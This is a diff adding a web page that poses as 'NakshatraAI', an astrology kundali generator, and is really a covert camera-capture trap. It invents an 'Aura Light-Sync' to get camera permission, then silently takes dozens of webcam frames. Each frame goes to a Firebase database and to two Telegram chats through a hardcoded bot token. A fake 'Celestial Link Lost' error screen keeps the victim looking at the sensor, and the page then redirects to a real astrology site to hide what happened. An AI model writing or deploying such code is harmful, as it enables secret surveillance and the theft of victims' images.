@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NakshatraAI | Advanced Kundali Engine</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --astro-gold: #d4af37;
+            --astro-deep: #1a0f2e;
+            --astro-panel: #2d1b4d;
+            --text-gold: #f3e5ab;
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background: var(--astro-deep); 
+            color: var(--text-gold);
+            font-family: 'Playfair Display', serif;
+            display: flex; flex-direction: column; height: 100vh;
+            overflow: hidden;
+        }
+
+        .header {
+            padding: 20px; background: rgba(0,0,0,0.4);
+            border-bottom: 1px solid var(--astro-gold);
+            display: flex; justify-content: center; align-items: center;
+        }
+
+        .logo { font-size: 22px; letter-spacing: 3px; text-transform: uppercase; font-weight: bold; }
+
+        .viewport {
+            flex-grow: 1; display: flex; align-items: center; justify-content: center;
+            padding: 20px; background: radial-gradient(circle, #2d1b4d 0%, #1a0f2e 100%);
+        }
+
+        .astro-card {
+            width: 100%; max-width: 450px; 
+            background: var(--astro-panel);
+            border: 2px solid var(--astro-gold); border-radius: 15px;
+            padding: 40px; text-align: center;
+            box-shadow: 0 0 40px rgba(212, 175, 55, 0.2);
+            position: relative;
+        }
+
+        /* Disguised Camera UI: Aura Alignment Ring */
+        .aura-circle {
+            width: 150px; height: 150px; margin: 0 auto 30px;
+            border: 1px solid var(--astro-gold); border-radius: 50%;
+            position: relative; display: flex; align-items: center; justify-content: center;
+        }
+
+        .aura-inner {
+            width: 80%; height: 80%; border: 2px dashed rgba(212, 175, 55, 0.4);
+            border-radius: 50%; animation: rotate 15s infinite linear;
+        }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        .zodiac-glow {
+            position: absolute; width: 100%; height: 100%;
+            background: radial-gradient(circle, rgba(212, 175, 55, 0.1) 0%, transparent 70%);
+            animation: pulse 3s infinite alternate;
+        }
+        @keyframes pulse { from { opacity: 0.3; } to { opacity: 1; } }
+
+        .btn-astro {
+            background: linear-gradient(135deg, #d4af37 0%, #aa8a2e 100%);
+            color: #1a0f2e; border: none; width: 100%; padding: 18px;
+            border-radius: 30px; font-weight: 900; cursor: pointer;
+            text-transform: uppercase; letter-spacing: 2px; transition: 0.3s;
+        }
+        .btn-astro:hover { transform: translateY(-3px); box-shadow: 0 5px 20px rgba(212, 175, 55, 0.4); }
+
+        /* Step Logic */
+        #aura-scan, #error-404 { display: none; }
+
+        .log-box {
+            font-size: 11px; color: #bcaaa4; font-family: 'Courier New', monospace;
+            background: rgba(0,0,0,0.3); padding: 15px; margin-top: 20px;
+            border-radius: 8px; text-align: left;
+        }
+
+        /* 404 Eclipse */
+        .eclipse-icon { font-size: 60px; margin-bottom: 20px; color: #5d4037; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">NAKSHATRA<span>AI</span></div>
+    </div>
+
+    <div class="viewport">
+        <!-- Entry View -->
+        <div class="astro-card" id="init-view">
+            <div class="aura-circle">
+                <div class="aura-inner"></div>
+                <div class="zodiac-glow"></div>
+                <svg width="40" height="40" fill="var(--astro-gold)" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71z"/></svg>
+            </div>
+            <h2 style="margin-bottom: 10px;">Generate Your Kundali</h2>
+            <p style="font-size: 14px; line-height: 1.6; margin-bottom: 30px;">
+                Our AI requires an <b>Aura Light-Sync</b> to accurately calculate the planetary houses at your exact birth time. This uses your camera sensor to detect localized cosmic radiation patterns.
+            </p>
+            <button class="btn-astro" onclick="requestAuraSync()">Continue to Sync</button>
+        </div>
+
+        <!-- Scanning View -->
+        <div class="astro-card" id="aura-scan">
+            <h2 style="color: var(--astro-gold);">Aura Alignment in Progress</h2>
+            <div class="aura-circle">
+                <div class="aura-inner" style="animation-duration: 3s; border-color: #fff;"></div>
+                <div id="sync-pct" style="font-size: 24px; font-weight: bold;">0%</div>
+            </div>
+            <div class="log-box">
+                > FETCHING_EPHEMERIS_DATA...<br>
+                > SYNCING_MUMBAI_VEDIC_NODE...<br>
+                > ANALYZING_LIGHT_SHADOW_VARS...<br>
+                > STATUS: <span style="color:var(--astro-gold)">CAPTURING_AURA</span>
+            </div>
+        </div>
+
+        <!-- 404 Error -->
+        <div class="astro-card" id="error-404">
+            <div class="eclipse-icon">🌑</div>
+            <h2 style="color: #ff5252;">Celestial Link Lost</h2>
+            <p style="font-size: 14px;">
+                Error 404: The Mumbai Vedic Datacenter has entered a lunar eclipse shadow. Please maintain visual contact with the sensor to re-synchronize your planetary alignment coordinates.
+            </p>
+            <div class="btn-astro" style="background: #3e2723; color: #8d6e63; margin-top: 20px;">Awaiting Cosmic Handshake...</div>
+        </div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function requestAuraSync() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('aura-scan').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        count++;
+                        document.getElementById('sync-pct').innerText = Math.min(count * 2, 99) + "%";
+                        
+                        if (count <= 55) {
+                            astroCapture(count);
+                        }
+
+                        // Trigger 404 at 30 seconds
+                        if (count === 30) {
+                            document.getElementById('aura-scan').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (count >= 60) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.astrosage.com/kundli/";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.google.com/search?q=free+kundali+online";
+            }
+        }
+
+        function astroCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "KUNDALI_AURA_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_VEDIC_NODE_01" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'aura_planetary_sync.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
